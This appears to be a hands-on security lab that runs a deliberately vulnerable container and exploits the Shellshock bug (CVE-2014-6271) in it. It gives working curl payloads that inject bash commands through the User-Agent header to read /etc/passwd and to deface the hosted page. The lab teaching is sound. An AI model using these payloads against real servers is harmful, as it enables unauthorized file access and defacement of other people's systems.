# **Vulnerable Libraries**

### *Some containers that are often used and available on `DockerHub` are not updated regularly, which results in them having vulnerable packages and libraries. Shellshock(Bashdoor) is one such vulnerability found in older versions of bash that haven't been updated.*

### **Lab Image : `Containers`**

---

#### Step 1:

* Run an image that is vulnerable to ShellShock on the provisioned server

```commandline
docker run -d -it -p 8080:80 vulnerables/cve-2014-6271
```

* Fetch the public IP of the server

```commandline
serverip
```

---

#### Step 2:

* Verify that is application is running by accessing it on the browser

```commandline
echo "http://$(serverip):8080"
```

* Exploit the vulnerability and access `/etc/passwd` of the vulnerable container

```commandline
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://$(serverip):8080/cgi-bin/vulnerable
```

* By exploiting ShellShock, deface the website

```commandline
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1> DEFACED! ;) </h1></body></html>\" > /var/www/index.html'" http://$(serverip):8080/cgi-bin/vulnerable
```

* Verify by accessing the application on the browser

```commandline
echo "http://$(serverip):8080"
```

---

#### Step 3:

* Stop all containers

```commandline
clean-docker
```

---

### Reading Material/References:
